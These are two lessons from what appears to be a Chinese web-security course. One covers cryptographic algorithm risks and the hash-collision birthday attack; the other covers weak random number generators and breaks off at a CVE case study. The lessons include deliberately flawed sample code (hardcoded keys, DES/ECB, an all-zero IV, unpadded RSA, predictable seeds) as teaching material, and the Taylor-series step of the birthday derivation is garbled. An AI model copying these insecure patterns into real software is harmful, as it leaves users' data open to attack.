<p>你可以尝试通过OpenSSL来生成自己的root CA以及签发证书吗？</p>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="09 密码算法问题：数学知识如何提高代码可靠性？" class="title">09 密码算法问题：数学知识如何提高代码可靠性？</h1>
                            <div><p>你好我是王昊天，今天这一讲我们来一起学习密码算法问题。</p>

<p>温州话素以难懂著名，据传连温州附近的其他城市也很难理解。这种客观条件，为使用温州话传递秘密信息创造了土壤，因此有一种说法是，抗日战争时期中国军队使用温州话进行秘密通信。</p>

<p>这听起来确实还挺有可行性的，而且二战时期美军就曾使用纳瓦霍语做出类似的操作。</p>

<p>使用一种复杂形式的通用性语言作为“加密”方案，虽然在某种现实应用中可以奏效，但在算法选择上其实并不明智。</p>

<p>要知道，语言是可以翻译的。因此，如果将信息传递的安全性完全依赖于语言复杂性特质，一旦这种语言具有较大受众，对方就很可能具备该类语言的解析能力，从而使该语言失去保密效果。</p>

<p>在密码学中，这种使用难懂语言的加密方案可以归类到的古典密码算法，而现代社会普遍采用了现代密码学，加密信息的安全性已经不再依赖密码算法的保密性。</p>

<p>这一讲，我们就来一起研究密码算法的安全性。</p>

<h2 id="数学层面的密码安全风险">数学层面的密码安全风险</h2>

<h3 id="古典密码学">古典密码学</h3>

<p>古典密码学是密码学中的一个类型，主要使用<strong>替换式密码</strong>或<strong>移项式密码</strong>。尽管古典密码学由于安全性不足等问题现在已经逐渐退出实际应用了，但是我们从它开始了解密码学的发展历程，可以帮助你理解更深层的密码学原理。那么接下来，我们就来看几种经典的古典密码算法。</p>

<p><strong>凯撒密码</strong>是一种广为人知的加密技术，是一种替换式密码。它的加密逻辑是非常简单的，明文中的字母按照固定偏移向后取值，结果即为密文，反之即是解密过程。</p>

<pre><code class="language-plain">明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ
密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC
</code></pre>

<p>凯撒加密也可以使用更直观的数学公式来表示：</p>

<pre><code class="language-plain">Res_Enc = ( plain_text + n ) mod 26
Res_Dec = ( cipher_text - n ) mod 26
其中n代表偏移量
</code></pre>

<p>可以看到，如此简单的加解密逻辑，在目前的技术发展下安全性是非常低的，站在当下，凯撒密码的影响如何我们已无从知晓，但是从凯撒密码的知名度和影响力来看，它确实是在当时被广泛使用的。根据现有的记载，直到公元9世纪，人们都没有任何技术能够破解这种最基本、最简单的替换密码，要知道凯撒可是生活在公元前1世纪。</p>

<p>在了解凯撒密码的原理之后，如果让你来强化加密算法，你会选择什么方案呢？</p>

<p>也许聪明的你已经想到了，最直观的方案就是，让字母的替代逻辑更加复杂。凯撒密码是一种经典的单字母替代式密码，那么它的进阶形态就变成了多字母替代式密码，在历史上它还有一个经典的名称——<strong>维吉尼亚密码。</strong></p>

<p>维吉尼亚密码的运算逻辑会稍显复杂，首先会生成一个二维矩阵Matrix，然后再选择一个关键字X：</p>

<pre><code class="language-plain">Matrix:
                A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
                B C D E F G H I J K L M N O P Q R S T U V W X Y Z A
                C D E F G H I J K L M N O P Q R S T U V W X Y Z A B
                D E F G H I J K L M N O P Q R S T U V W X Y Z A B C
                E F G H I J K L M N O P Q R S T U V W X Y Z A B C D
                F G H I J K L M N O P Q R S T U V W X Y Z A B C D E
                G H I J K L M N O P Q R S T U V W X Y Z A B C D E F
                H I J K L M N O P Q R S T U V W X Y Z A B C D E F G
                I J K L M N O P Q R S T U V W X Y Z A B C D E F G H
                J K L M N O P Q R S T U V W X Y Z A B C D E F G H I
                K L M N O P Q R S T U V W X Y Z A B C D E F G H I J
                L M N O P Q R S T U V W X Y Z A B C D E F G H I J K
                M N O P Q R S T U V W X Y Z A B C D E F G H I J K L
                N O P Q R S T U V W X Y Z A B C D E F G H I J K L M
                O P Q R S T U V W X Y Z A B C D E F G H I J K L M N
                P Q R S T U V W X Y Z A B C D E F G H I J K L M N O
                Q R S T U V W X Y Z A B C D E F G H I J K L M N O P
                R S T U V W X Y Z A B C D E F G H I J K L M N O P Q
                S T U V W X Y Z A B C D E F G H I J K L M N O P Q R
                T U V W X Y Z A B C D E F G H I J K L M N O P Q R S
                U V W X Y Z A B C D E F G H I J K L M N O P Q R S T
                V W X Y Z A B C D E F G H I J K L M N O P Q R S T U
                W X Y Z A B C D E F G H I J K L M N O P Q R S T U V
                X Y Z A B C D E F G H I J K L M N O P Q R S T U V W
                Y Z A B C D E F G H I J K L M N O P Q R S T U V W X
                Z A B C D E F G H I J K L M N O P Q R S T U V W X Y

X:
                WORD
</code></pre>

<p>接下来根据明文长度，延展X使其和明文一样长，取得Y：</p>

<pre><code class="language-plain">X: WORD
plain_text: I LOVE CRYPTOGRAPHY
Y: W ORDW ORDWORDWORDW
</code></pre>

<p>根据每一位的明文以及Y的取值，分别匹配到Matrix的坐标，即可得出密文，以第一位加密为例：</p>

<pre><code class="language-plain">Matrix(W,I) = E
</code></pre>

<p>逐位运算即可取得加密结果：</p>

<pre><code class="language-plain">cipher_text: E ZFYA QIBLHFJNOGKU
</code></pre>

<p>学习了替换式密码之后，我们再来看一下移位式密码。移位式密码，字母本身是不变的，但是传递过程中的顺序会按照特定的定义进行改变。举个最简单的例子：</p>

<pre><code class="language-plain">plain_text: Hello World!
cipher_text: olleH !dlroW
</code></pre>

<p>可以看到，移位式密码的逻辑是比较简单的，更复杂的移位式密码也是在变换上更加复杂，但是底层逻辑是不变的。</p>

<h3 id="现代密码学">现代密码学</h3>

<p>现代密码学主要可以分为两个领域，<strong>对称密钥密码学</strong>和<strong>非对称密钥密码学</strong>，这两者之间最核心区别就是，加密和解密的密钥是否相同。</p>

<p>对于对称密钥密码学，还可以进一步分为<strong>分组密码</strong>与<strong>流密码</strong>两个算法种类。其中，分组密码的输入使用明文的一个区块和密钥，然后输出相同大小的密文区块；流密码相对于分组密码则更为灵活，输入中的明文可以任意长，经过与密钥轮的数学操作后，输出与明文等长的加密流。</p>

<p>非对称密钥密码学还有一个名字，公钥密码学。其特征就是具备公钥和私钥两个不同密钥，并且均可以参与加密与解密过程。使用公钥加密、私钥解密是典型的隐秘信息保护流程；而使用私钥加密、公钥解密则是典型的签名流程。可以说，除加密外，公钥密码学最大的贡献就是实现了数字签名，互联网上的PKI体系以及SSL/TLS等网络安全机制均以此为基础构建。</p>

<p>关于底层原理，公钥密码算法的难度大多体现在计算复杂度上，比如RSA源于大整数因数分解问题、DSA源于离散对数问题、椭圆曲线密码学则源于椭圆曲线相关数学难题。由于这些底层问题多涉及模数乘法或指数运算，因此计算复杂度相较于对称密钥算法会更高。</p>

<p>为了在实际应用中达到更高的效率，普遍采用的方案是外部使用公钥密码算法，内部使用对称密钥算法，这样既可以获得公钥密码算法的优秀特性，可以获得对称密码算法的高执行效率，业内一种实践方案是信封加密。</p>

<p>目前，现代密码学在一些领域已经有非常前沿的实际应用场景，如交互证明、零知识、区块链与安全多方计算等。</p>

<h3 id="密码算法安全性">密码算法安全性</h3>

<p>经典密码通常很容易破解，普遍通过唯密文攻击法，在仅知密文的情况下就可以完成攻击。以凯撒密码为例，有限的密钥个数可以通过暴力破解完成攻击；替代式密码虽然有着更大的密钥数，但是会被频率分析破解；更进一步地，维吉尼亚密码使用多个替换防止简单的频率分析，但是依然可以使用更为先进的卡西斯基试验进行破解。</p>

<p>和经典密码学相比，现代密码学的安全性已经不依赖于加密算法的保密性，而是基于密钥的安全性，也就是说即使在密码算法完全公开的情况下，只要攻击者无法获取密钥就无法破解密文。</p>

<p>关于密文的破解有多种分类，其中最为普遍的划分方法是，<strong>按照攻击者获取的信息多少</strong>进行划分。在唯密文攻击中，攻击者的已知信息只有密文；在已知明文攻击中，攻击者的已知信息包括多个明文、密文对；在选择明文攻击中，攻击者可以自选任意明文，并获得相应的密文；在选择密文攻击中，攻击者可以选择任意密文，并获得相应明文。</p>

<p>另外一种破解分类，是<strong>按照信息来源</strong>进行分类的，像我们提到的4种攻击方式以及密码算法层的分析都被归类为主信道攻击；与之相对的是侧信道攻击，这种攻击方式重点关注加密设备在执行过程暴露的信息，比如通过分析加解密时间、错误码等来进行破解。</p>

<h2 id="工程实践中的密码安全风险">工程实践中的密码安全风险</h2>

<p>除了数学理论层面的安全性风险之外，在工程实践中我们也会遇到许多密码学相关的安全风险，接下来就带你了解有哪些典型的风险场景。</p>

<p><strong>硬编码密钥</strong></p>

<p>在一些应用系统中，开发者可能会为了方便将加密密钥硬编码在源码中，在这种情况下，一旦应用系统被入侵，攻击者将可以轻松获得密钥，从而为后续入侵、提权、持久化埋下伏笔。</p>

<pre><code class="language-c++ hljs language-c"><span class="hljs-type">int</span> <span class="hljs-title function_">verifyAdmin</span><span class="hljs-params">( <span class="hljs-type">char</span> *password)</span>
{
    <span class="hljs-keyword">if</span>( <span class="hljs-built_in">strcmp</span>(password, <span class="hljs-string">"68af404b513073584c4b6f22b6c63e6b"</span>) )
    {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Incorrect Password!\n"</span>);
        <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);
    }
    <span class="hljs-keyword">return</span>(<span class="hljs-number">1</span>);
}
</code></pre>

<p><strong>随机值重用</strong></p>

<p>很多密码算法在应用过程中，会涉及到随机值的使用。在一些开发场景中，开发者将随机值固定为某一数值，使得随机值发生重用，这样可能会导致身份伪装等中间人攻击行为的发生。</p>

<pre><code class="language-c++ hljs language-c"><span class="hljs-type">void</span> <span class="hljs-title function_">encryptAndSendPassword</span><span class="hljs-params">( <span class="hljs-type">char</span> *password)</span>
{
    <span class="hljs-type">char</span> *tmp = <span class="hljs-string">"bad"</span>;
    ...
    <span class="hljs-type">char</span> *data = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">20</span>);
    <span class="hljs-type">int</span> para_size = <span class="hljs-built_in">strlen</span>(tmp) + <span class="hljs-built_in">strlen</span>(password);
    <span class="hljs-type">char</span> *paragraph = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(para_size);
    SHA1((<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)paragraph, para_size, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)data);
    ...
}
</code></pre>

<p><strong>不安全的加密算法</strong></p>

<p>在开发过程中使用不安全的加密算法，可能会导致敏感信息的泄露，同时这会给攻击者更多攻击的机会，因为如果一个加密算法存在安全缺陷，那么对它的攻击方式很可能已经广为人知了。</p>

<p>也许你会好奇，是谁设计了不安全的加密算法呢？加密算法从诞生到应用，一定是经过了广泛实践检验的。但是由于近些年科技高速发展，无论是从理论算法层面发现了加密算法的缺陷，还是从算力增长的角度发现了某种现实性攻击，都使得加密算法的更新速度大幅提高，那些曾经被验证是安全的加密算法现如今也就变得不再安全了。</p>

<p>如下代码示例使用了DES加密算法，考虑到目前DES已经被认为是不安全的，因此这段代码的安全性存在缺陷，在实际应用中目前普遍采用AES作为替代方案。</p>

<pre><code class="language-php hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encryptPassword</span>(<span class="hljs-params"> <span class="hljs-variable">$password</span> </span>)
</span>{
    <span class="hljs-variable">$iv_size</span> = <span class="hljs-title function_ invoke__">mcrypt_get_iv_size</span>(MCRYPT_DS, MCRYPT_MODE_ECB);
    <span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">mcrypt_create_iv</span>(<span class="hljs-variable">$iv_size</span>, MCRYPT_RAND);
    <span class="hljs-variable">$key</span> = <span class="hljs-string">"This is a password encryption key"</span>;
    <span class="hljs-variable">$encrypted_password</span> = <span class="hljs-title function_ invoke__">mcrypt_encrypt</span>(MCRYPT_DES, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$password</span>, MCRYPT_MODE_ECB, <span class="hljs-variable">$iv</span>);
    ...
}
</code></pre>

<p><strong>可预测的初始化向量（Initialization Vector, IV）</strong>-
许多加密算法会使用初始化向量来强化安全性，以DES加密算法为例，其加密模式分为多种，其中CBC模式就与初始化向量相关。在设置初始化向量的过程中，如果初始化向量可以被预测，那么算法的安全性就会降低。</p>

<p>这里我们仍然以DES算法的CBC模式为例，来分析初始化向量对于加密算法安全性的影响。</p>

<p>在了解CBC模式前，你需要先了解ECB模式，这是最简单的块密码加密模式，全称是电子密码本（Eclectronic codebook）模式，ECB模式在加密前根据块的大小将明文分为若干块，之后每块使用相同的密钥单独加密，解密同理。</p>

<p>ECB模式的优势很明显，首先加密逻辑非常简单，其次由于上下文无关，所以有利于并行计算，最后仍然得益于上下文无关，误差不会被传递；它的劣势也是很清晰的，一方面是无法隐藏明文的模式，另一方面攻击者可以直接对明文进行主动攻击。</p>

<p>为了增强ECB模式的安全性，CBC模式被引入进来。CBC全称是密码分组链接（CBC，Cipher-block chaining）模式。在CBC模式下，每个明文块需要先与前一个密文块进行异或（xor），然后再进行加密，因此每个密文块都依赖于它前面的所有明文块。那么初始化向量又是在何处被引入的呢？为了保证每条消息的唯一性，在第一个明文块会直接与初始化向量进行异或。用数学语言来表述如下：</p>

<pre><code class="language-bash hljs">cipher_text_0 = IV
cipher_text_i = E_k{plain_text_i XOR cipher_text_{i-1}}
</code></pre>

<p>如果CBC模式下的初始化向量发生重复使用、全0设置等情况，就会使同样的明文产生同样的密文结果；即使初始化向量未发生重用，对于攻击者来说密文仍然是可预测的，这依然会使加密算法在面对选择明文攻击时的安全性大大降低。</p>

<p>如下代码使用CBC模式进行加密，但在编码过程中将初始化向量设置为全0，这就导致密文更加容易预测，并且可能会面临字典攻击等安全威胁：</p>

<pre><code class="language-java hljs"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cipher</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
        <span class="hljs-type">byte</span>[] plain_text = <span class="hljs-string">"Hello World!"</span>.getBytes();
        <span class="hljs-type">byte</span>[] iv = {
            <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>
        };
        <span class="hljs-type">KeyGenerator</span> <span class="hljs-variable">kg</span> <span class="hljs-operator">=</span> KeyGenerator.getInstace(<span class="hljs-string">"DES"</span>);
        kg.init(<span class="hljs-number">56</span>);
        <span class="hljs-type">SecretKey</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> kg.generateKey();
        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstace(<span class="hljs-string">"DES/CBC/PKCS5Padding"</span>);
        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ips</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, ips);
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>

<p><strong>不安全的Padding</strong></p>

<p>许多加密算法都支持padding机制，一方面padding是为了补全明文，使其满足加密算法的格式要求；另一方面在padding机制产生作用后，明文将更难以预测，攻击者的攻击复杂度也会相应提高。以下是一种典型的错误示例：</p>

<pre><code class="language-java hljs"><span class="hljs-keyword">public</span> Cipher <span class="hljs-title function_">getRSACipher</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Cipher</span> <span class="hljs-variable">rsa</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">try</span> {
        rsa = javax.crypto.Cipher.getInstance(<span class="hljs-string">"RSA/NONE/NoPadding"</span>);
    }
    <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-comment">// ...</span>
    }
    <span class="hljs-keyword">return</span> rsa;
}
</code></pre>

<h2 id="案例实战">案例实战</h2>

<p>通过一系列典型的安全风险场景，相信你对密码安全风险已经有了更加深刻的理解。接下来我们从两个更为复杂的实战案例出发，看看它在实际应用中又能给我们什么启发。</p>

<h3 id="数字签名伪造">数字签名伪造</h3>

<p>我们知道数字签名是互联网信任体系的根基，那么数字签名是否一定是可信的呢？为了寻找答案，我们要站在攻击者的视角来审视整个体系。</p>

<p>设想一种场景，在这种场景中攻击者试图执行一次签名诈骗攻击。首先攻击者准备了一份正常的合同m，以及一份伪造的合同m_fake，在不改变合同原本意义的情况下，通过插入逗号、空行、空格、同义词替换等行为，攻击者可以生成一系列以m和m_fake为原型的合同变体。攻击者了解在合同签署过程中使用的签名函数是f()，并通过运算在所有合同变体中找到了f(m) = f(m_fake)，于是攻击者可以将m带给合作方签名。在签名完成后，攻击者可以将签名取下并附到m_fake上，以此来证明合作方签署了m_fake合同。</p>

<p>再设想一种场景，我们都知道在下载软件安装包时，最好的情况是去官网下载，一方面是来源更可信，另一方面是官网同时也会披露对应安装包的MD5值供用户验证。那么如果攻击者通过碰撞的方式，制造出了一个恶意应用程序，同时该恶意程序的MD5值与官方安装包一致，就可能会导致用户错误地安装恶意程序，从而被攻击者控制。</p>

<p>通过这两种场景我们会发现，<strong>数字签名也未必可信</strong>。目前技术的快速发展，使得数字签名的伪造成为可能，虽然这种攻击方式的门槛仍然较高，但随着算力和算法的发展，该攻击方式的实施成本会进一步降低，这也是为什么我们需要不断探索强度更高的密码算法。</p>

<h3 id="hash碰撞与生日攻击">HASH碰撞与生日攻击</h3>

<p>HASH碰撞在数学上有一个原型叫“生日攻击”，问题是“一个班级需要有多少人，才能保证每个同学的生日都不一样？”。这里我先直接说答案，你肯定会十分吃惊，如果要求出现相同生日的同学概率不超过5%，那么这个班只能有7个人；如果概率是50%，那么这个班只需要23个人。</p>

<p>如果按照HASH碰撞的角度来理解，哈希值的空间范围是365，只需要计算23个哈希就有50%的概率出现碰撞。接下来我们就以50%为标准，来判断通用意义上HASH碰撞的可行性。</p>

<p><strong>数学推导</strong></p>

<p>这里我们仍然以生日攻击为例，来推导数学公式。如果所有人的生日都不相同，那么意味着每个同学需要在选择自己生日时，排除已经被选择掉的天数，在剩余的日期中做出选择。</p>

<pre><code class="language-plain">p(n) = 1 · (1-1/365) · (1-2/365) · ... · (1-(n-1)/365)
</code></pre>

<p>参考泰勒公式：</p>

<pre><code class="language-plain">e^x = 1 + x + x^2/2 + x^3/6 + ...
在x很小的情况下 -&gt; e^x ≈ 1 + x
</code></pre>

<p>将泰勒公式带入p(n)：</p>

<pre><code class="language-plain">p(n) ≈ 1 · e^(-1/365) · (-2/365) ··· (-(n-1)/365)
= e^(-n(n-1)/730)
</code></pre>

<p>进一步将p(n)通用化，并将结果从不碰撞转换为碰撞的概率：</p>

<pre><code class="language-plain">p(n,h) = 1 - e^(-n(n-1)/2h)
</code></pre>

<p>进行简单的数学变换：</p>

<pre><code class="language-plain">n(p,h) = (2h·ln(1/(1-p)))^1/2
</code></pre>

<p>实际应用中，暂时我们以50%为标准，将0.5代入p：</p>

<pre><code class="language-plain">n(0.5,H) = 1.1774 · (h ^ 1/2)
</code></pre>

<p><strong>抽象理解和安全验证边界</strong></p>

<p>从抽象层面来看，生日攻击的理念类似于以空间换时间的攻击方式。主要原因是生日攻击的目标一般是HASH碰撞，而HASH计算的本质是将近乎无限的输入映射到定长或者有限长的hash串，这就注定了多对一的映射关系。因此，<strong>必然存在两个输入M1和M2能够满足HASH(M1)=HASH(M2)，这其中的M1和M2就是我们定义的HASH碰撞攻击结果</strong>。</p>

<p>尤其值得注意的是，这里我们探讨的HASH碰撞与生日攻击，没有利用任何HASH函数内部的实现机制，因此这种攻击是具有通用型的，而防御方式也相对简单，只需要增加HASH的长度，提高攻击者的计算成本即可。</p>

<h2 id="总结">总结</h2>

<p>这节课我们学习了密码学相关的知识。</p>

<p>古代战争中使用的密令、密码本等都是密码学的一种缩影，它们大都可以划分到古典密码学分支。在现代密码学分支出现之前，古典密码学依靠加密算法的保密性，发挥了巨大的作用，并且诞生了以凯撒密码、维吉尼亚密码为首的一系列经典的替换式密码以及位移式密码算法。</p>

<p>随着算法研究的不断深入以及计算机算力的增长，经典密码学的安全性难以得到保障，于是诞生了现代密码学分支。在现代密码学分支中，根据加密/解密密钥是否相同又可以划分为对称加密算法与非对称加密算法，其中DES、AES、RC4等都是知名的对称加密算法，而RSA、椭圆曲线加密等都是知名的非对称加密算法。</p>

<p>在Web应用开发中，我们既会面临密码学相关技术的工程化风险，包括硬编码密钥、随机值重用、使用不安全的算法、可预测的初始化向量以及Padding相关的安全问题；也会面临理论层面比如HASH值空间碰撞风险。这些都需要我们了解并熟悉加密算法的原理，这样才能够很好的驾驭这架复杂又强大的机器。</p>

<p>相信通过本节课的学习，你已经构建了清晰宏观的密码学视角，在面对特定安全场景时能够处理得安全又不失优雅。密码学是一个快速发展的数学分支，深入地了解其中原理一定能够帮助你构建更加强大、安全、可靠的应用系统！</p>

<h2 id="思考题">思考题</h2>

<ol>
<li>你可以尝试使用卡西斯基试验破解维吉尼亚密码吗？</li>
<li>你可以尝试计算我们日常使用的HASH能够抵御多少量级的碰撞攻击吗？</li>
</ol>

<p>欢迎在评论区留下你的思考，我们下节课再见。</p>
</div>
                        </div><div class="book-post">
                            
                            <div align="center"><a target="_blank" href="https://www.aliyun.com/minisite/goods?userCode=lc4iupk4">阿里云2C2G3M 99元/年，老用户 也可以哦</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="10 弱随机数生成器：攻击者如何预测随机数？" class="title">10 弱随机数生成器：攻击者如何预测随机数？</h1>
                            <div><p>你好，我是王昊天。</p>

<p>上节课我们学习了密码算法的安全，有了设计优秀的密码算法，就像买了一扇牢固的防盗门，那么我们再也不用担心小偷了吗？</p>

<p>并不是这样，有了防盗门，我们还需要保管好钥匙才行。上节课我们一直在讨论防盗门的质量问题，而防盗门的钥匙，也就是密码算法所使用的密钥是如何生成的呢？这里就需要一个引入新的概念——随机数。</p>

<p>随机数的概念是很好理解的，但是实际操作起来却很难真的生成。</p>

<p>你一定玩过某一种棋牌类游戏，比如麻将、德州扑克这些，或者更简单的猜拳游戏也可以。考虑到每个人的游戏水平有高低，胜率一定会有些差异。在经常一起玩的朋友当中，一定有某个人在的时候你更容易赢，另外某个人在的时候你更容易输，而且这种输赢是具有统计意义上稳定性的，为什么呢？</p>

<p>因为在面对没有差异的选择时，你是有选择倾向性的，这种倾向性可能来自于你的回忆、你的幸运数字、你的生日等等。</p>

<p>所以，我们以为的随机数，往往没有那么随机。</p>

<h2 id="随机数">随机数</h2>

<p>我们来正式地认识一下随机数，这一概念在不同领域往往代表着不同的含义。我们一起来由浅入深地聊聊。</p>

<p>首先随机数最基本的概念是<strong>统计学意义上的伪随机数</strong>，对于给定的一个样本集，每个元素出现的概率是大概相似的，只要从人类的视角看上去一组数是随机的，就符合统计学意义上的伪随机数定义；因为统计学上的伪随机数，在给定随机样本和随机算法的情况下，能够有效地演算出随机样本的剩余部分，因此统计学上的伪随机数需要得到进一步地安全强化，<strong>密码学安全的伪随机数</strong>应运而生；而随机数的最终概念形态，则是<strong>真随机数</strong>，其定义是在满足前两个条件的基础上，再增加一个随机样本不可重现的条件。</p>

<p>然而，严格的真随机数是一种非常理想的形态，从真实情况来看，只要给定边界条件，真随机数其实并不存在。因为无论背景辐射、物理噪音还是抛掷硬币，只要经过非常精密的观察和测量，都是可以被预测的。但是在这些例子中，实际的边界条件非常复杂，而且是极难观测的，因此我们可以认为这些条件下产生的随机数是非常接近真随机数的伪随机数。</p>

<p>那么为什么随机数的随机性如此重要呢？因为在我们前一节课程中探讨过的密码算法需要大量随机数的参与，一旦随机数的生成可以被预测，任何加密算法都将失去意义。</p>

<h3 id="随机数的生成">随机数的生成</h3>

<p>产生随机数的方法被称为随机数生成器（RNG, random number generator）。</p>

<p>在实际应用中我们往往使用伪随机就足够了，这些随机数主要通过一个固定的、可重复的计算方法生成，这些计算方法经过特殊的设计，使得产生的结果具有类似真随机数的统计学特征。这种生成的伪随机数一般只是重复的周期比较大的数列，以算法和种子值共同作用生成。这种生成伪随机数的方法叫伪随机数生成器（PRNG, pseudo-random number generator），进一步能够生成密码学安全随机数的方法叫密码学伪随机数生成器（CPRNG, cryptographic pseudo-random number generator）。</p>

<p>从实现的角度来看，伪随机数生成器会在函数内部维护一个状态，每个随机数的诞生，时都是从这个状态计算出来的，这个状态随着下一个随机数的生成而改变，而第一个状态则是由种子初始化得到。</p>

<p><img src="assets/6a3eeaed80774cf080231e41e779881a.jpg" alt="图片"></p>

<p>在一些密码学关键设施中，会使用到真正的随机数，这些随机数往往由噪音、辐射等物理现象生成，这个过程中所使用的生成器叫物理性随机数生成器。</p>

<p>在了解随机数概念及其生成方案后，接下来我们来了解一下开发过程中会面临哪些随机数方面的安全风险。</p>

<h3 id="无效的随机数">无效的随机数</h3>

<p>当我们在开发应用的过程中，如果所使用的随机数算法不够安全，比如使用了PRNG而并没有使用CPRNG，或者使用了不安全的种子值，就可能会使得攻击者能够猜测出下一个生成的随机数，进而凭借猜测的随机数发动攻击。至于PRNG究竟哪里不安全，我在后文的案例部分再向你详细介绍。</p>

<p>举个例子，如下代码尝试去为用户生成session值：</p>

<pre><code class="language-php hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateSessionValue</span>(<span class="hljs-params"> <span class="hljs-variable">$user</span> </span>) </span>{
    <span class="hljs-comment">// 注释：设置种子值</span>
    <span class="hljs-title function_ invoke__">srand</span>( <span class="hljs-variable">$user</span> );
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">rand</span>();
}
</code></pre>

<p>由于代码中所使用的种子值每次都是不变的，因此该函数返回的session值也不会发生变化，攻击者可以利用该缺陷尝试劫持会话。</p>

<h3 id="小空间种子选择">小空间种子选择</h3>

<p>在上面描述的坏代码样本中，如果我们尝试去优化，那么方案是什么呢？</p>

<p>考虑到，这段代码存在的问题，是将种子值设定成了固定数值，那么为了解决这个问题，我们现在尝试将种子值，设置为随机数值：</p>

<pre><code class="language-php hljs"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateSessionValue</span>(<span class="hljs-params"> <span class="hljs-variable">$user</span> </span>) </span>{
    <span class="hljs-comment">// 注释：设置种子值</span>
    <span class="hljs-variable">$random_val</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>);
    <span class="hljs-title function_ invoke__">srand</span>( <span class="hljs-variable">$random_val</span> );
    <span class="hljs-comment">// ...</span>
}
</code></pre>

<p>这样的优化，是否会修复代码中不安全漏洞呢？答案是否定的，这种优化，只是小幅度提高了，漏洞利用的复杂程度。在上述代码中，由于random_val的取值空间过小，将会面临暴力破解攻击，攻击者只需要执行10次遍历，就可以找到被生成的随机数。</p>

<p>由于使用了取值空间很小的种子，这段代码将被暴露在暴力破解攻击中。要知道计算机是一种执行确定行为的机器，因此是无法生成真正的随机数的。虽然伪随机数生成器从算法设计层面满足了相似的随机性特征，但其一旦设定了种子值，其生成的随机数序列就是完全确定的。正因如此，我们要尽量确保种子值对于攻击者是不可预测的。</p>

<h3 id="密码学安全的伪随机数">密码学安全的伪随机数</h3>

<p>再进一步，我们将种子值的随机性放大，继续优化代码的安全性。</p>

<p>可以看到，如下代码使用<code>Random.nextInt()</code>函数来生成新的URL地址，其种子值由<code>(new Date()).getTime()</code>生成，该数值为1970年1月1日00:00:00 GMT至今的毫秒数，已经具备较强的随机性和不可预测性。那么，这是否能说明，这段代码已经安全了呢？</p>

<pre><code class="language-java hljs">String <span class="hljs-title function_">generateUrl</span><span class="hljs-params">( String baseUrl )</span> {
    <span class="hljs-type">Random</span> <span class="hljs-variable">randomGen</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();
    randomGen.setSeed((<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime());
    <span class="hljs-keyword">return</span> (baseUrl + randomGen.nextInt(<span class="hljs-number">400000000</span>) + <span class="hljs-string">".html"</span>);
}
</code></pre>

<p>答案并非如此。<code>Random.nextInt()</code>函数是<code>java.util.Random</code>类的成员函数，而<code>java.util.Random</code>类是一个统计学意义上的伪随机数生成器，因此会更容易被攻击者猜测到生成的数值，<strong>对于安全性敏感的应用，建议使用密码学安全的随机数生成器<code>java.security.SecureRandom</code></strong>。</p>

<h2 id="案例实战">案例实战</h2>

<p>做了这么多年安全，有一句话我非常喜欢，“Talk is cheap, show me the code”。</p>

<p>很多高深的安全知识，讲出来似乎都十分有道理，但是实践起来往往不是那么回事。现在我们就来一起解答上面提到的问题：虽然推荐使用CPRNG，但是PRNG究竟哪里不安全了呢？知其然更要知其所以然，接下来我们就上干货，带你实战攻击伪随机数生成器！</p>

<p>这次我们以漏洞CVE-2019-10908为例，这是一个在Airsonic 10.2.1版本存在的漏洞。Airsonic是一个免费并且开源的产品，由社区驱动开发和维护，它是一个提供分享和访问多媒体流功能的Web应用。</p>

<p>该项目的RecoverController.java通过org.apache.commons.lang.RandomStringUtils来生成用户密码，而RandomStringUtils内部实现其实是使用了java.util.Random。这里引入了两个潜在的安全隐患，一方面Random类是PRNG，无法提供密码学安全的伪随机数生成；另一方面RandomStringUtils使用了48bit的种子，使其能够较容易地被攻击者爆破。</p>

